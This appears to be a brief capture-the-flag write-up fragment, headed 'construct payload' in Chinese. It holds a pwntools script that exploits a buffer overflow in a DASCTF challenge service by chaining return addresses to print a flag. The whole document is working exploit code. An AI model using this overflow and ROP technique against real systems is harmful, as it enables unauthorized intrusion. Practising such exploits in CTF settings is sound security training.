构造payload

```python
from pwn import *

r=remote("41c8deb9a3ad49cdf9ba6871.tcp-ctf2.dasctf.com", 9999, ssl=True, sni="41c8deb9a3ad49cdf9ba6871.tcp-ctf2.dasctf.com")

get_secret=0x080489A0

printf=0x0804F0A0

fl4g=0x080ECA2D

find_fmt=0x80cdd14

exit=0x0804E660

payload=b'a'*45+p32(get_secret)+p32(printf)+p32(exit)+p32(find_fmt)+p32(fl4g)
r.sendline(payload)
r.interactive()
```
